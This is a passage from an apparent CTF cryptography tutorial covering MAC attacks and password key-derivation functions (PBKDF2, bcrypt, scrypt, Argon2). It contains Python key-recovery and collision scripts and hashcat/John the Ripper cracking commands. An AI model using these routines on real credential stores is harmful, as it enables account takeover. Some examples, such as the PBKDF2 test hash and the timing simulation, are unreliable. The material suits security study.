[ ] Identify hash function (SHA-256, SHA-512, MD5, AES, ChaCha20)
[ ] Check output size (truncated or full)
[ ] Extract any MAC values from challenge

VULNERABILITY ASSESSMENT:
[ ] Weak key derivation (password-based without KDF)
[ ] Dictionary attack feasible (common passwords)
[ ] Key reuse across multiple messages/contexts
[ ] Truncated output (smaller collision space)
[ ] Timing side-channel (non-constant-time comparison)
[ ] Replay attack potential (no nonce/timestamp)
[ ] Known plaintext available (enables targeted attacks)

EXPLOITATION:
[ ] If weak key: dictionary attack with wordlist
[ ] If truncated: brute force collision (max 2^(8*bytes))
[ ] If reuse (Poly1305/CBC-MAC): algebraic recovery
[ ] If timing vulnerability: microsecond-precision timing
[ ] If protocol: challenge-response/replay attack
[ ] If known plaintext: differential analysis

POST-EXPLOITATION:
[ ] Recovered MAC key: verify with test message
[ ] Forge new MAC: verify against oracle if available
[ ] Decrypted message: check for flag format
[ ] Validate solution against challenge requirements
```

---

### Complete MAC Exploitation Suite

```python
#!/usr/bin/env python3
"""
MAC CTF Exploitation Suite: Comprehensive tools for MAC vulnerability testing.
"""

import hmac
import hashlib
from Crypto.Cipher import AES
from Crypto.Hash import CMAC
from Crypto.Util.Padding import pad

class MACSuite:
    def __init__(self):
        pass
    
    def hmac_dictionary_attack(self, message, correct_mac, wordlist_path, hash_func=hashlib.sha256):
        """Attack HMAC via dictionary of weak keys."""
        print("[*] HMAC Dictionary Attack")
        print(f"[*] Message: {message[:50]}...")
        print(f"[*] Target MAC: {correct_mac.hex()[:16]}...\n")
        
        with open(wordlist_path, 'r') as f:
            for i, word in enumerate(f):
                word = word.strip().encode()
                test_mac = hmac.new(word, message, hash_func).digest()
                
                if hmac.compare_digest(test_mac, correct_mac):
                    print(f"[+] KEY FOUND: {word.decode()}")
                    print(f"[+] Attempts: {i+1}")
                    return word
                
                if (i + 1) % 10000 == 0:
                    print(f"[-] Tried {i+1} keys...")
        
        print("[!] Key not found in wordlist")
        return None
    
    def hmac_truncation_collision(self, key, message, truncation_bytes=2):
        """Find collision in truncated HMAC."""
        full_mac = hmac.new(key, message, hashlib.sha256).digest()
        truncated_mac = full_mac[:truncation_bytes]
        
        print(f"[*] HMAC Truncation Collision Attack")
        print(f"[*] Original MAC (truncated): {truncated_mac.hex()}")
        print(f"[*] Collision space: 2^{8*truncation_bytes}\n")
        
        for i in range(2**(8*truncation_bytes)):
            test_msg = message + i.to_bytes(4, 'big')
            test_mac = hmac.new(key, test_msg, hashlib.sha256).digest()[:truncation_bytes]
            
            if test_mac == truncated_mac and test_msg != message:
                print(f"[+] COLLISION FOUND at attempt {i}")
                print(f"[+] Message: {test_msg.hex()}")
                return test_msg
        
        return None
    
    def cmac_attack(self, message, correct_tag, wordlist_path):
        """Attack CMAC via key dictionary."""
        print("[*] CMAC Dictionary Attack\n")
        
        with open(wordlist_path, 'r') as f:
            for i, word in enumerate(f):
                word = word.strip()
                key = (word * 2)[:16].encode()
                
                try:
                    cipher = AES.new(key, AES.MODE_ECB)
                    cmac_obj = CMAC.new(cipher)
                    cmac_obj.update(message)
                    
                    if cmac_obj.digest() == correct_tag:
                        print(f"[+] KEY FOUND: {word}")
                        print(f"[+] Attempts: {i+1}")
                        return key
                except:
                    pass
                
                if (i + 1) % 5000 == 0:
                    print(f"[-] Tried {i+1} keys...")
        
        print("[!] Key not found")
        return None
    
    def cbc_mac_compute(self, key, message):
        """Compute CBC-MAC."""
        padded_msg = pad(message, AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, b'\x00' * AES.block_size)
        ciphertext = cipher.encrypt(padded_msg)
        return ciphertext[-AES.block_size:]
    
    def timing_attack_simulation(self, key, message, attacker_mac_bytes=4):
        """Simulate timing side-channel on MAC verification."""
        import time
        
        correct_mac = hmac.new(key, message, hashlib.sha256).digest()
        attacker_mac = bytearray(attacker_mac_bytes)
        
        print(f"[*] Timing Attack Simulation ({attacker_mac_bytes} bytes)\n")
        
        # Find correct bytes via timing
        for position in range(attacker_mac_bytes):
            best_byte = 0
            best_time = 0
            
            for byte_val in range(256):
                test_mac = bytes(attacker_mac)
                test_mac = test_mac[:position] + bytes([byte_val]) + test_mac[position+1:]
                
                # Time verification
                start = time.perf_counter()
                for _ in range(1000):
                    vulnerable_verify = (test_mac == correct_mac[:attacker_mac_bytes])
                elapsed = time.perf_counter() - start
                
                if elapsed > best_time:
                    best_time = elapsed
                    best_byte = byte_val
            
            attacker_mac[position] = best_byte
            print(f"[+] Position {position}: 0x{best_byte:02x}")
        
        return bytes(attacker_mac)

# Usage
if __name__ == "__main__":
    suite = MACSuite()
    
    # Example 1: HMAC dictionary attack
    key = b"password123"
    message = b"important_data"
    mac = hmac.new(key, message, hashlib.sha256).digest()
    
    # Create test wordlist
    with open("/tmp/test_wordlist.txt", "w") as f:
        f.write("password\n")
        f.write("password123\n")
        f.write("admin\n")
    
    recovered_key = suite.hmac_dictionary_attack(message, mac, "/tmp/test_wordlist.txt")
    
    # Example 2: Truncation collision
    if recovered_key:
        collision = suite.hmac_truncation_collision(recovered_key, message, truncation_bytes=2)
```

This completes the comprehensive MAC section covering HMAC, CMAC, Poly1305, and CBC-MAC with practical CTF exploitation strategies and tools.

---

## Key Derivation

### PBKDF2

Password-Based Key Derivation Function 2 (PBKDF2) is defined in RFC 2898 (PKCS #5). It applies a pseudorandom function (typically HMAC-SHA256) iteratively to derive keys from passwords.

**Algorithm Structure:**

```
DK = PBKDF2(PRF, Password, Salt, c, dkLen)

Where:
- PRF: Pseudorandom function (HMAC-SHA1, HMAC-SHA256, etc.)
- Password: Master password
- Salt: Cryptographic salt
- c: Iteration count
- dkLen: Desired key length in bytes
```

**Python Implementation (Standard Library):**

```python
import hashlib
import os
from binascii import hexlify, unhexlify

# Basic PBKDF2 usage
password = b"mypassword"
salt = os.urandom(16)  # 128-bit salt
iterations = 100000
key_length = 32  # 256-bit key

derived_key = hashlib.pbkdf2_hmac('sha256', password, salt, iterations, key_length)
print(f"Derived key: {hexlify(derived_key).decode()}")

# With different hash functions
key_sha1 = hashlib.pbkdf2_hmac('sha1', password, salt, iterations, key_length)
key_sha512 = hashlib.pbkdf2_hmac('sha512', password, salt, iterations, key_length)
```

**CTF Analysis and Cracking:**

```python
# Verify PBKDF2 hash
def verify_pbkdf2(password, salt, iterations, expected_hash, hash_algo='sha256'):
    """
    Verify password against PBKDF2 hash
    """
    derived = hashlib.pbkdf2_hmac(
        hash_algo,
        password.encode() if isinstance(password, str) else password,
        unhexlify(salt) if isinstance(salt, str) else salt,
        iterations,
        len(unhexlify(expected_hash) if isinstance(expected_hash, str) else expected_hash)
    )
    
    expected = unhexlify(expected_hash) if isinstance(expected_hash, str) else expected_hash
    return derived == expected

# Example verification
salt_hex = "1234567890abcdef1234567890abcdef"
hash_hex = "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8"
iterations = 10000

result = verify_pbkdf2("password123", salt_hex, iterations, hash_hex)
print(f"Password valid: {result}")
```

**Hashcat PBKDF2 Cracking:**

```bash
# PBKDF2-HMAC-SHA1
# Format: sha1:iterations:salt_hex:hash_hex
echo "sha1:1000:736f6d6573616c74:0c60c80f961f0e71f3a9b524af6012062fe037a6" > pbkdf2.hash

hashcat -m 12000 pbkdf2.hash wordlist.txt
# Mode 12000: PBKDF2-HMAC-SHA1

# PBKDF2-HMAC-SHA256
# Mode 10900: PBKDF2-HMAC-SHA256
hashcat -m 10900 pbkdf2_sha256.hash wordlist.txt

# PBKDF2-HMAC-SHA512
# Mode 12100: PBKDF2-HMAC-SHA512
hashcat -m 12100 pbkdf2_sha512.hash wordlist.txt

# With rules for password mutations
hashcat -m 10900 pbkdf2.hash wordlist.txt -r rules/best64.rule

# Mask attack for known patterns
hashcat -m 10900 pbkdf2.hash -a 3 ?l?l?l?l?d?d?d?d
```

**John the Ripper PBKDF2:**

```bash
# Format PBKDF2 hash for john
# Format: $pbkdf2-sha256$iterations$salt_base64$hash_base64

cat > pbkdf2.john << 'EOF'
user:$pbkdf2-sha256$10000$c29tZXNhbHQ$lv5nzesDxLJm3aUGCxSRXbXXX
EOF

john --wordlist=rockyou.txt pbkdf2.john

# Show cracked passwords
john --show pbkdf2.john

# Custom PBKDF2 format extraction (from application dumps)
# [Inference] Format varies by application - may require custom script
```

**CTF-Specific Weak Configurations:**

```python
# Identify weak PBKDF2 parameters
def analyze_pbkdf2_strength(iterations, salt_length, key_length, hash_algo):
    """
    Assess PBKDF2 configuration strength
    [Inference] Based on OWASP/NIST recommendations
    """
    issues = []
    
    # Iteration count recommendations (as of 2024)
    min_iterations = {
        'sha1': 1300000,      # OWASP 2023
        'sha256': 600000,     # OWASP 2023
        'sha512': 210000      # OWASP 2023
    }
    
    if iterations < min_iterations.get(hash_algo, 600000):
        issues.append(f"Low iteration count: {iterations} (min recommended: {min_iterations.get(hash_algo)})")
    
    if salt_length < 16:
        issues.append(f"Short salt: {salt_length} bytes (minimum 16 bytes recommended)")
    
    if key_length < 16:
        issues.append(f"Short key: {key_length} bytes (minimum 16 bytes recommended)")
    
    if hash_algo == 'sha1':
        issues.append("Using SHA1 (deprecated, prefer SHA256 or SHA512)")
    
    return issues

# Example analysis
issues = analyze_pbkdf2_strength(10000, 8, 32, 'sha256')
for issue in issues:
    print(f"[!] {issue}")
```

**Extracting PBKDF2 from Common Formats:**

```python
# Django PBKDF2 format
def parse_django_pbkdf2(hash_string):
    """
    Parse Django's PBKDF2 format
    Format: pbkdf2_sha256$iterations$salt$hash
    """
    parts = hash_string.split('$')
    
    if len(parts) != 4:
        return None
    
    algo = parts[0]  # e.g., "pbkdf2_sha256"
    iterations = int(parts[1])
    salt = parts[2]
    hash_b64 = parts[3]
    
    return {
        'algorithm': algo.replace('pbkdf2_', ''),
        'iterations': iterations,
        'salt': salt,
        'hash': hash_b64
    }

# Example
django_hash = "pbkdf2_sha256$600000$randomsalt$g5pWxF5ChF/KoJXAqxbLWqMXXX=="
parsed = parse_django_pbkdf2(django_hash)
print(parsed)

# WPA/WPA2 PSK (uses PBKDF2-HMAC-SHA1)
def derive_wpa_psk(passphrase, ssid):
    """
    Derive WPA/WPA2 Pre-Shared Key
    Uses PBKDF2-HMAC-SHA1 with 4096 iterations
    """
    return hashlib.pbkdf2_hmac('sha1', 
                               passphrase.encode(), 
                               ssid.encode(), 
                               4096, 
                               32)

psk = derive_wpa_psk("password123", "MyWiFiNetwork")
print(f"WPA PSK: {hexlify(psk).decode()}")
```

**Performance Benchmarking:**

```python
import time

def benchmark_pbkdf2(iterations_list, hash_algo='sha256'):
    """
    Benchmark PBKDF2 performance for cracking estimation
    """
    password = b"test"
    salt = b"somesalt"
    key_length = 32
    
    results = {}
    
    for iterations in iterations_list:
        start = time.time()
        hashlib.pbkdf2_hmac(hash_algo, password, salt, iterations, key_length)
        elapsed = time.time() - start
        
        hashes_per_sec = 1 / elapsed if elapsed > 0 else float('inf')
        results[iterations] = {
            'time': elapsed,
            'rate': hashes_per_sec
        }
    
    return results

# Benchmark
results = benchmark_pbkdf2([1000, 10000, 100000, 600000])
for iters, data in results.items():
    print(f"{iters} iterations: {data['time']:.4f}s ({data['rate']:.2f} H/s)")
    
# [Inference] GPU cracking can be 100-1000x faster
```

### bcrypt

bcrypt is a password hashing function based on the Blowfish cipher, designed by Niels Provos and David Mazières. It includes an adaptive cost factor that increases computation time as hardware improves.

**Algorithm Properties:**

- Based on Eksblowfish (expensive key setup variant of Blowfish)
- Cost factor (work factor) ranges from 4 to 31
- Actual iterations = 2^cost
- Built-in salt generation
- Fixed output: 60 character string

**Python Implementation:**

```python
import bcrypt

# Generate bcrypt hash
password = b"mysecretpassword"

# Generate hash with default cost (12)
hashed = bcrypt.hashpw(password, bcrypt.gensalt())
print(f"Hash: {hashed.decode()}")
# Output format: $2b$12$salt(22chars)hash(31chars)

# Specify cost factor (4-31)
hashed_fast = bcrypt.hashpw(password, bcrypt.gensalt(rounds=4))  # Fast, weak
hashed_strong = bcrypt.hashpw(password, bcrypt.gensalt(rounds=14))  # Stronger

# Verify password
if bcrypt.checkpw(password, hashed):
    print("Password matches!")
else:
    print("Password incorrect")

# Check incorrect password
wrong_password = b"wrongpassword"
if bcrypt.checkpw(wrong_password, hashed):
    print("Match")
else:
    print("No match")  # Expected output
```

**bcrypt Hash Format:**

```
$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
\__/\/ \____________________/\_____________________________/
Alg Cost      Salt (22chars)            Hash (31chars)

Algorithm identifiers:
- $2a$ = Original bcrypt
- $2b$ = Fixed minor bug in 2a
- $2x$ = PHP bug compatibility  
- $2y$ = PHP fixed version
```

**Parsing bcrypt Hashes:**

```python
import re

def parse_bcrypt(hash_string):
    """
    Parse bcrypt hash components
    """
    # Format: $2[abxy]$cost$salthash
    pattern = r'^\$2([abxy])\$(\d{2})\$([A-Za-z0-9./]{53})$'
    match = re.match(pattern, hash_string)
    
    if not match:
        return None
    
    version = match.group(1)
    cost = int(match.group(2))
    salt_hash = match.group(3)
    
    salt = salt_hash[:22]
    hash_part = salt_hash[22:]
    
    return {
        'version': f"2{version}",
        'cost': cost,
        'iterations': 2**cost,
        'salt': salt,
        'hash': hash_part
    }

# Example
bcrypt_hash = "$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW"
parsed = parse_bcrypt(bcrypt_hash)
print(f"Cost: {parsed['cost']}, Iterations: {parsed['iterations']}")
```

**Hashcat bcrypt Cracking:**

```bash
# bcrypt mode: 3200
cat > bcrypt.hash << 'EOF'
$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
EOF

# Dictionary attack
hashcat -m 3200 bcrypt.hash rockyou.txt

# With rules
hashcat -m 3200 bcrypt.hash wordlist.txt -r rules/best64.rule

# Mask attack
hashcat -m 3200 bcrypt.hash -a 3 ?u?l?l?l?l?d?d?d?s

# Check status
hashcat -m 3200 bcrypt.hash --status

# Resume session
hashcat -m 3200 bcrypt.hash --restore
```

**John the Ripper bcrypt:**

```bash
# Create hash file
echo '$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW' > bcrypt.john

# Crack with wordlist
john --wordlist=rockyou.txt bcrypt.john

# Show format info
john --list=formats | grep -i bcrypt

# Incremental mode
john --incremental bcrypt.john

# Show cracked
john --show bcrypt.john
```

**CTF Weak Configuration Analysis:**

```python
def analyze_bcrypt_strength(cost):
    """
    Analyze bcrypt cost factor
    [Inference] Based on current hardware capabilities
    """
    iterations = 2**cost
    
    # Timing estimates (approximate for modern CPU)
    # [Unverified] Actual performance varies by hardware
    approx_time_ms = (2**cost) * 0.0001  # Rough estimate
    
    if cost < 10:
        return f"WEAK: Cost {cost} ({iterations:,} iterations) - ~{approx_time_ms:.2f}ms per hash"
    elif cost < 12:
        return f"MODERATE: Cost {cost} ({iterations:,} iterations) - ~{approx_time_ms:.2f}ms per hash"
    else:
        return f"STRONG: Cost {cost} ({iterations:,} iterations) - ~{approx_time_ms:.2f}ms per hash"

# Example analysis
for cost in [4, 8, 10, 12, 14]:
    print(analyze_bcrypt_strength(cost))
```

**Extracting bcrypt from Applications:**

```python
# Flask-Bcrypt format (same as standard bcrypt)
def verify_flask_bcrypt(password, hash_string):
    """
    Verify password against Flask-Bcrypt hash
    """
    import bcrypt
    return bcrypt.checkpw(password.encode(), hash_string.encode())

# Node.js bcrypt format (compatible)
def extract_bcrypt_from_json(json_file):
    """
    Extract bcrypt hashes from JSON database dumps
    Common in CTF web challenges
    """
    import json
    
    with open(json_file, 'r') as f:
        data = json.load(f)
    
    hashes = []
    for user in data.get('users', []):
        if 'password' in user and user['password'].startswith('$2'):
            hashes.append({
                'username': user.get('username', 'unknown'),
                'hash': user['password']
            })
    
    return hashes

# Example usage
# hashes = extract_bcrypt_from_json('users.json')
```

**Timing Attack Considerations:**

```python
import time

def timing_safe_compare(hash1, hash2):
    """
    Constant-time comparison for bcrypt hashes
    [Inference] Prevents timing attacks during verification
    """
    if len(hash1) != len(hash2):
        return False
    
    result = 0
    for a, b in zip(hash1, hash2):
        result |= ord(a) ^ ord(b)
    
    return result == 0

# Note: bcrypt.checkpw() already uses constant-time comparison
# This is for educational purposes when implementing custom verification
```

### scrypt

scrypt is a memory-hard key derivation function designed by Colin Percival. It resists hardware brute-force attacks by requiring significant amounts of memory.

**Algorithm Parameters:**

```
scrypt(password, salt, N, r, p, dkLen)

Where:
- N: CPU/memory cost (power of 2, e.g., 2^14 = 16384)
- r: Block size parameter (typically 8)
- p: Parallelization parameter (typically 1)
- dkLen: Desired key length
```

**Python Implementation:**

```python
import hashlib
from base64 import b64encode, b64decode
import os

# Using hashlib (Python 3.6+)
password = b"mysecretpassword"
salt = os.urandom(16)

# Standard parameters
N = 2**14  # 16384 - CPU/memory cost
r = 8      # Block size
p = 1      # Parallelization

key_length = 32

# Derive key
derived_key = hashlib.scrypt(password, salt=salt, n=N, r=r, p=p, dklen=key_length)
print(f"Derived key: {b64encode(derived_key).decode()}")

# Alternative: using scrypt library (more options)
try:
    import scrypt as scrypt_lib
    
    # Same operation with scrypt library
    derived_key2 = scrypt_lib.hash(password, salt, N, r, p, key_length)
    print(f"Using scrypt lib: {b64encode(derived_key2).decode()}")
except ImportError:
    print("scrypt library not installed (pip install scrypt)")
```

**scrypt Hash Format (Passlib):**

```python
# Passlib scrypt format
from passlib.hash import scrypt as passlib_scrypt

# Generate hash
password = "mysecretpassword"
hash_string = passlib_scrypt.hash(password)
print(f"Hash: {hash_string}")
# Format: $scrypt$ln=N_log2,r=r,p=p$salt_base64$hash_base64

# Verify
is_valid = passlib_scrypt.verify(password, hash_string)
print(f"Valid: {is_valid}")

# Custom parameters
hash_custom = passlib_scrypt.using(rounds=15, block_size=8, parallelism=1).hash(password)
print(f"Custom: {hash_custom}")
```

**Parsing scrypt Hashes:**

```python
import re
from base64 import b64decode

def parse_scrypt_hash(hash_string):
    """
    Parse scrypt hash (Passlib format)
    Format: $scrypt$ln=14,r=8,p=1$salt_b64$hash_b64
    """
    pattern = r'^\$scrypt\$ln=(\d+),r=(\d+),p=(\d+)\$([A-Za-z0-9+/=]+)\$([A-Za-z0-9+/=]+)$'
    match = re.match(pattern, hash_string)
    
    if not match:
        return None
    
    ln = int(match.group(1))
    r = int(match.group(2))
    p = int(match.group(3))
    salt_b64 = match.group(4)
    hash_b64 = match.group(5)
    
    return {
        'N': 2**ln,
        'N_log2': ln,
        'r': r,
        'p': p,
        'salt': b64decode(salt_b64),
        'hash': b64decode(hash_b64)
    }

# Example
scrypt_hash = "$scrypt$ln=14,r=8,p=1$c29tZXNhbHQ$L5xhqP8c8TcF9xxxxx"
parsed = parse_scrypt_hash(scrypt_hash)
if parsed:
    print(f"N={parsed['N']}, r={parsed['r']}, p={parsed['p']}")
```

**Hashcat scrypt Cracking:**

```bash
# scrypt mode: 8900
# Format: SCRYPT:N:r:p:salt_hex:hash_hex

# Example hash file
cat > scrypt.hash << 'EOF'
SCRYPT:16384:8:1:736f6d6573616c74:4c7978687150386338546346397878787878
EOF

# Dictionary attack
hashcat -m 8900 scrypt.hash rockyou.txt

# Note: scrypt is very slow to crack
# [Inference] GPU advantages reduced due to memory requirements

# Check GPU memory requirements
hashcat -m 8900 scrypt.hash --benchmark

# Adjust workload for available memory
hashcat -m 8900 scrypt.hash wordlist.txt -w 3
```

**John the Ripper scrypt:**

```bash
# scrypt format in john
# [Unverified] Support may be limited in default builds

# Check if scrypt is available
john --list=formats | grep -i scrypt

# If available, crack with:
john --format=scrypt scrypt.john --wordlist=rockyou.txt
```

**CTF Parameter Analysis:**

```python
def analyze_scrypt_strength(N, r, p, memory_available_mb=4096):
    """
    Analyze scrypt parameters and estimate cracking difficulty
    [Inference] Based on memory requirements and computation time
    """
    # Memory usage calculation
    memory_required_bytes = 128 * r * N
    memory_required_mb = memory_required_bytes / (1024**2)
    
    # Time factor (relative to bcrypt cost 12)
    # [Unverified] Rough approximation
    time_factor = (N * r * p) / (2**14 * 8 * 1)
    
    analysis = {
        'memory_mb': memory_required_mb,
        'time_factor': time_factor,
        'parallel_instances': int(memory_available_mb / memory_required_mb) if memory_required_mb > 0 else 0
    }
    
    # Strength assessment
    if N < 2**10:
        analysis['strength'] = "VERY WEAK - N too small"
    elif N < 2**14:
        analysis['strength'] = "WEAK - Below recommended N=2^14"
    elif N >= 2**14 and r >= 8 and p >= 1:
        analysis['strength'] = "STRONG - Standard parameters or better"
    else:
        analysis['strength'] = "MODERATE"
    
    return analysis

# Example analysis
params = [
    (2**10, 8, 1),   # Weak
    (2**14, 8, 1),   # Standard
    (2**16, 8, 1),   # Strong
    (2**20, 8, 1),   # Very strong
]

for N, r, p in params:
    result = analyze_scrypt_strength(N, r, p)
    print(f"N={N}, r={r}, p={p}: {result['strength']} ({result['memory_mb']:.2f} MB)")
```

**Custom Verification Implementation:**

```python
def verify_scrypt_hash(password, salt, N, r, p, expected_hash):
    """
    Verify password against scrypt hash
    """
    import hashlib
    
    derived = hashlib.scrypt(
        password.encode() if isinstance(password, str) else password,
        salt=salt if isinstance(salt, bytes) else salt.encode(),
        n=N,
        r=r,
        p=p,
        dklen=len(expected_hash)
    )
    
    return derived == expected_hash

# Example usage
salt = b"somesalt"
N, r, p = 2**14, 8, 1
password = "testpassword"

# Generate expected hash
expected = hashlib.scrypt(password.encode(), salt=salt, n=N, r=r, p=p, dklen=32)

# Verify
is_valid = verify_scrypt_hash(password, salt, N, r, p, expected)
print(f"Password valid: {is_valid}")
```

**Extraction from Common Formats:**

```python
# Extract scrypt from cryptocurrency wallets
def extract_ethereum_scrypt(keystore_json):
    """
    Extract scrypt parameters from Ethereum keystore
    Common in CTF blockchain challenges
    """
    import json
    
    with open(keystore_json, 'r') as f:
        keystore = json.load(f)
    
    if keystore.get('crypto', {}).get('kdf') == 'scrypt':
        params = keystore['crypto']['kdfparams']
        return {
            'dklen': params['dklen'],
            'n': params['n'],
            'r': params['r'],
            'p': params['p'],
            'salt': params['salt']
        }
    
    return None

# Example structure (Ethereum keystore v3)
example_keystore = {
    "crypto": {
        "kdf": "scrypt",
        "kdfparams": {
            "dklen": 32,
            "n": 262144,  # 2^18
            "r": 8,
            "p": 1,
            "salt": "hex_encoded_salt"
        }
    }
}
```

### Argon2

Argon2 is the winner of the 2015 Password Hashing Competition, designed to resist GPU, ASIC, and side-channel attacks. It has three variants: Argon2d (data-dependent), Argon2i (data-independent), and Argon2id (hybrid).

**Algorithm Variants:**

- **Argon2d**: Maximum resistance to GPU attacks, vulnerable to side-channels
- **Argon2i**: Resistant to side-channel attacks, less GPU-resistant
- **Argon2id**: Recommended hybrid (Argon2i for first pass, Argon2d for subsequent)

**Parameters:**

```
Argon2(password, salt, t, m, p, type)

Where:
- t: Time cost (iterations)
- m: Memory cost (kibibytes)
- p: Parallelism degree
- type: 0=Argon2d, 1=Argon2i, 2=Argon2id
```

**Python Implementation:**

```python
from argon2 import PasswordHasher
from argon2.low_level import hash_secret_raw, Type
import os

# High-level API (recommended for password storage)
ph = PasswordHasher()

# Hash password with default parameters
password = "mysecretpassword"
hash_string = ph.hash(password)
print(f"Hash: {hash_string}")
# Format: $argon2id$v=19$m=65536,t=3,p=4$salt_b64$hash_b64

# Verify password
try:
    ph.verify(hash_string, password)
    print("Password verified!")
except Exception as e:
    print(f"Verification failed: {e}")

# Custom parameters
custom_hasher = PasswordHasher(
    time_cost=4,        # iterations
    memory_cost=65536,  # 64 MB
    parallelism=2,      # threads
    hash_len=32,        # output length
    salt_len=16         # salt length
)

custom_hash = custom_hasher.hash(password)
print(f"Custom hash: {custom_hash}")

# Low-level API (for key derivation)
salt = os.urandom(16)
time_cost = 3
memory_cost = 65536  # KiB
parallelism = 4
hash_len = 32

# Argon2id (recommended)
derived_key = hash_secret_raw(
    secret=password.encode(),
    salt=salt,
    time_cost=time_cost,
    memory_cost=memory_cost,
    parallelism=parallelism,
    hash_len=hash_len,
    type=Type.ID  # Argon2id
)

print(f"Derived key: {derived_key.hex()}")

# Argon2i (side-channel resistant)
key_argon2i = hash_secret_raw(
    secret=password.encode(),
    salt=salt,
    time_cost=time_cost,
    memory_cost=memory_cost,
    parallelism=parallelism,
    hash_len=hash_len,
    type=Type.I
)

# Argon2d (maximum GPU resistance)
key_argon2d = hash_secret_raw(
    secret=password.encode(),
    salt=salt,
    time_cost=time_cost,
    memory_cost=memory_cost,
    parallelism=parallelism,
    hash_len=hash_len,
    type=Type.D
)
```

**Argon2 Hash Format:**

```
$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$hash_base64
\_______/\___/\______________/\__________/\__________/
  Type   Ver    Parameters      Salt       Hash

Type: argon2d, argon2i, or argon2id
v: Version (19 is current)
m: Memory in KiB
t: Time cost (iterations)
p: Parallelism
```

**Parsing Argon2 Hashes:**

```python
import re
from base64 import b64decode

def parse_argon2_hash(hash_string):
    """
    Parse Argon2 hash string
    """
    # Pattern for Argon2 hash
    pattern = r'^\$argon2(id|i|d)\$v=(\d+)\$m=(\d+),t=(\d+),p=(\d+)\$([A-Za-z0-9+/=]+)\$([A-Za-z0-9+/=]+)$'
    match = re.match(pattern, hash_string)
    
    if not match:
        return None
    
    type_str = match.group(1)
    version = int(match.group(2))
    memory = int(match.group(3))
    time_cost = int(match.group(4))
    parallelism = int(match.group(5))
    salt_b64 = match.group(6)
    hash_b64 = match.group(7)
    
    type_map = {'d': 'Argon2d', 'i': 'Argon2i', 'id': 'Argon2id'}
    
    return {
        'type': type_map.get(type_str),
        'version': version,
        'memory_cost': memory,
        'time_cost': time_cost,
        'parallelism': parallelism,
        'salt': b64decode(salt_b64),
        'hash': b64decode(hash_b64)
    }

# Example
argon2_hash = "$argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$BwQJp3w0xxxxx"
parsed = parse_argon2_hash(argon2_hash)
if parsed:
    print(f"Type: {parsed['type']}, Memory: {parsed['memory_cost']} KiB, Time: {parsed['time_cost']}, Parallelism: {parsed['parallelism']}")
````

**Hashcat Argon2 Cracking:**

```bash
# Argon2 modes in Hashcat
# Mode 29100: Argon2d
# Mode 29200: Argon2i  
# Mode 29300: Argon2id

# Format hash for hashcat
cat > argon2.hash << 'EOF'
$argon2id$v=19$m=4096,t=3,p=1$c29tZXNhbHQ$iWh06vD8Fy27wf9npn6FXWiCX4K6pW6Ue1Bnzz07Z8A
EOF

# Dictionary attack on Argon2id
hashcat -m 29300 argon2.hash rockyou.txt

# With rules
hashcat -m 29300 argon2.hash wordlist.txt -r rules/best64.rule

# Mask attack
hashcat -m 29300 argon2.hash -a 3 ?l?l?l?l?d?d?d?d

# For Argon2i
hashcat -m 29200 argon2i.hash wordlist.txt

# For Argon2d
hashcat -m 29100 argon2d.hash wordlist.txt

# Performance tuning (Argon2 is memory-intensive)
hashcat -m 29300 argon2.hash wordlist.txt -w 3 -O

# Check benchmark
hashcat -m 29300 --benchmark

# [Inference] Argon2 cracking is significantly slower than bcrypt/PBKDF2
# GPU advantages are reduced due to high memory requirements
````

**John the Ripper Argon2:**

```bash
# Check Argon2 support
john --list=formats | grep -i argon2

# Crack Argon2 hash
john --format=argon2 argon2.john --wordlist=rockyou.txt

# Show cracked passwords
john --show --format=argon2 argon2.john

# Incremental mode
john --format=argon2 --incremental argon2.john
```

**CTF Parameter Analysis:**

```python
def analyze_argon2_strength(time_cost, memory_cost, parallelism, hash_type='id'):
    """
    Analyze Argon2 parameters for security strength
    [Inference] Based on RFC 9106 and OWASP recommendations
    """
    analysis = {
        'type': f"Argon2{hash_type}",
        'time_cost': time_cost,
        'memory_mb': memory_cost / 1024,
        'parallelism': parallelism
    }
    
    # Memory recommendations (OWASP 2023)
    # [Inference] Minimum recommendations vary by use case
    min_memory = 19456  # 19 MiB minimum for password hashing
    rec_memory = 65536  # 64 MiB recommended
    
    # Time cost recommendations
    min_time = 2
    rec_time = 3
    
    issues = []
    
    if memory_cost < min_memory:
        issues.append(f"Memory too low: {memory_cost} KiB (min: {min_memory} KiB)")
    elif memory_cost < rec_memory:
        issues.append(f"Memory below recommended: {memory_cost} KiB (rec: {rec_memory} KiB)")
    
    if time_cost < min_time:
        issues.append(f"Time cost too low: {time_cost} (min: {min_time})")
    elif time_cost < rec_time:
        issues.append(f"Time cost below recommended: {time_cost} (rec: {rec_time})")
    
    if parallelism < 1:
        issues.append("Invalid parallelism value")
    
    # Type-specific warnings
    if hash_type == 'd':
        issues.append("Argon2d vulnerable to side-channel attacks (use Argon2id)")
    elif hash_type == 'i':
        issues.append("Argon2i less GPU-resistant (prefer Argon2id)")
    
    if issues:
        analysis['strength'] = "WEAK" if memory_cost < min_memory or time_cost < min_time else "MODERATE"
        analysis['issues'] = issues
    else:
        analysis['strength'] = "STRONG"
        analysis['issues'] = []
    
    return analysis

# Test various configurations
configs = [
    (1, 4096, 1, 'id'),      # Very weak
    (2, 19456, 1, 'id'),     # Minimum
    (3, 65536, 4, 'id'),     # Recommended
    (4, 131072, 8, 'id'),    # Strong
    (3, 65536, 4, 'd'),      # Wrong type
]

for t, m, p, type_val in configs:
    result = analyze_argon2_strength(t, m, p, type_val)
    print(f"\nArgon2{type_val}: t={t}, m={m} KiB, p={p}")
    print(f"Strength: {result['strength']}")
    if result['issues']:
        for issue in result['issues']:
            print(f"  - {issue}")
```

**Custom Verification Implementation:**

```python
from argon2.low_level import hash_secret_raw, Type, verify_secret
from base64 import b64encode, b64decode

def verify_argon2_custom(password, hash_string):
    """
    Verify password against Argon2 hash with custom parsing
    """
